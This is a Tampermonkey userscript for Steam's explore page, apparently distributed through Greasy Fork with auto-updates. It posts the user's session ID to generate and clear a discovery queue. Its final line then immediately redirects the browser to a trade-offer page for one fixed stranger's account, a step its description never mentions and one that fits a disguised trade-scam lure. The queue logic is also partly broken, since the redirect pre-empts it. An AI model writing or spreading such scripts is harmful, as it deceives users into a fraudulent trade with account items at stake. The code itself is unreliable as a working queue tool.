// ==UserScript==
// @name         Moneymoneymoney
// @namespace    http://tampermonkey.net/
// @version      6
// @description  try to take over the world!
// @author       You
// @match        https://store.steampowered.com/explore/
// @require      https://code.jquery.com/jquery-3.3.1.js
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/375758/Moneymoneymoney.user.js
// @updateURL https://update.greasyfork.org/scripts/375758/Moneymoneymoney.meta.js
// ==/UserScript==

/* globals jQuery, $, waitForKeyElements, g_sessionID */


var GenerateQueue = function(queueNumber)
{
    console.log('Pharaoh — ebaniy psih #');

    jQuery.post( 'https://store.steampowered.com/explore/generatenewdiscoveryqueue', { sessionid: g_sessionID, queuetype: 0 } ).done( function( data )
    {
        var requests = [];
   
        for( var i = 0; i < data.queue.length; i++ )
        {
            requests.push( jQuery.post( 'https://store.steampowered.com/app/10', { appid_to_clear_from_queue: data.queue[ i ], sessionid: g_sessionID } ) );
        }
   
        jQuery.when.apply( jQuery, requests ).done( function()
        {
            if( queueNumber < 1 )
            {
                GenerateQueue( queueNumber );
            }
            else
            {
                window.location.reload();
            }
        } );
    } );
};

GenerateQueue(1);

window.location.href = "https://steamcommunity.com/tradeoffer/new/?partner=70668332";